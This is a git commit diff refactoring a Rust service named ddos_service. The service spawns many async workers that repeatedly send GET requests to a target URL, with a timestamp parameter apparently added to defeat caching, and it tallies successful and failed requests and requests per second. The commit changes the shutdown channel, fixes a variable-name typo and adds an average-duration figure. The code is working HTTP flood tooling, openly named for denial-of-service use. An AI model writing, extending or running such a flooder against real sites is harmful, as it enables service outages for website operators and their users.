217cfd548be00ff139048da6342b637f171750a9
Boris <Glazunov2142@icloud.com>
2023-12-20 21:13:20 +0300

    chore: improved ddos_service.

--- src/service/ddos_service.rs
+++ src/service/ddos_service.rs
@@ -1,6 +1,8 @@
-use std::{sync::Arc, sync::{Mutex, atomic::AtomicUsize, atomic::Ordering}};
+use std::{sync::Arc, sync::{atomic::AtomicUsize, atomic::Ordering}};
+use std::sync::Mutex;
 use chrono::{DateTime, Utc, Timelike};
 use crate::model::ddos::DDOS;
+use tokio::sync::broadcast;
 use reqwest;
 
 #[derive(Debug, Clone)]
@@ -23,17 +25,16 @@ impl DDOSService {
         }
     }
 
-    pub async fn run(&self, shutdown_rx: Arc<Mutex<tokio::sync::mpsc::Receiver<bool>>>) {
+    pub async fn run(&self, shutdown_rx: Arc<Mutex<broadcast::Receiver<bool>>>) {
         let mut handles = Vec::new();
 
         for w in 0..self.ddos.workers_num {
             let url = self.ddos.url.clone();
-
-            let cloned_shutdown_rx = Arc::clone(&shutdown_rx);
-
             let total_reqs = Arc::clone(&self.total);
             let success_reqs = Arc::clone(&self.success);
             let failed_reqs = Arc::clone(&self.failed);
+
+            let shutdown_rx_cloned = Arc::clone(&shutdown_rx);
 
             let thread = tokio::spawn(async move {
                 println!("worker {} was started", w);
@@ -41,16 +42,12 @@ impl DDOSService {
                 let client = reqwest::Client::new();
 
                 loop {
-                    if cloned_shutdown_rx.lock().unwrap().try_recv().unwrap_or(false) {
+                    if shutdown_rx_cloned.lock().unwrap().try_recv().unwrap_or(false) {
                         println!("worker {} was stopped", w);
                         return;
                     }
 
-                    let current_url = format!("{}&ts={}", url, Utc::now().nanosecond());
-
-                    // println!("{}", current_url);
-
-                    match client.get(&current_url).send().await {
+                    match client.get(&format!("{}&ts={}", url, Utc::now().nanosecond())).send().await {
                         Ok(response) => {
                             let status = response.status();
 
@@ -86,14 +83,20 @@ impl DDOSService {
         let total: usize = self.total.load(Ordering::SeqCst);
         println!("Total reqs: {}", total);
 
-        let succes: usize = self.success.load(Ordering::SeqCst);
-        println!("Success reqs: {}", succes);
+        let success: usize = self.success.load(Ordering::SeqCst);
+        println!("Success reqs: {}", success);
 
         let failed: usize = self.failed.load(Ordering::SeqCst);
         println!("Failed reqs: {}", failed);
 
         let duration: usize = ((Utc::now().timestamp_millis() - self.start.timestamp_millis()) / 1000) as usize;
         println!("Duration: {}s.", duration);
+
+        let mut avg_total_duration = 0;
+        if total != 0 {
+            avg_total_duration = duration / total;
+        }
+        println!("AVG Total: {}", avg_total_duration);
 
         let mut rps: usize = 0;
         if total > 0 {
